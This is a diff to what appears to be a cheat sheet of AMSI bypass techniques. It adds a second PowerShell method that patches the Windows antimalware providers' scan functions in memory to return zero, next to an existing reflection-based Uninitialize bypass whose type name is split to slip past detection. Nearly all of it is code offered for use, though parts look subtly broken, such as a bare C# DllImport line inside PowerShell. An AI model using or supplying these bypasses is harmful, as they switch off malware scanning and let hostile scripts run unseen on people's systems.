@@ -30,3 +30,22 @@ $object = [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')
 $Uninitialize = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
 $Uninitialize.Invoke($object,$null)
 ```
+
+2nd Method by Maor Korkos
+```powershell
+[DllImport("amsi")]
+public static extern int AmsiInitialize(string appName, out IntPtr context);
+$SIZE_OF_PTR = 4; $NUM_OF_PROVIDERS = 2; $ctx = 0; $p = 0
+$ret_zero = [byte[]] (0xb8, 0x0, 0x00, 0x00, 0x00, 0xC3)
+[APIs]::AmsiInitialize("MyAmsiScanner", [ref]$ctx)
+for ($i = 0; $i -lt $NUM_OF_PROVIDERS; $i++)
+{
+$CAmsiAntimalware = [System.Runtime.InteropServices.Marshal]::ReadInt32($ctx+8)
+$AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt32($CAmsiAntimalware+36
++($i*$SIZE_OF_PTR))
+$AntimalwareProviderVtbl = [System.Runtime.InteropServices.Marshal]::ReadInt32($AntimalwareProvider)
+$AmsiProviderScanFunc = [System.Runtime.InteropServices.Marshal]::ReadInt32($AntimalwareProviderVtbl+12)
+[APIs]::VirtualProtect($AmsiProviderScanFunc, [uint32]6, 0x40, [ref]$p)
+[System.Runtime.InteropServices.Marshal]::Copy($ret_zero, 0, $AmsiProviderScanFunc, 6)
+}
+```
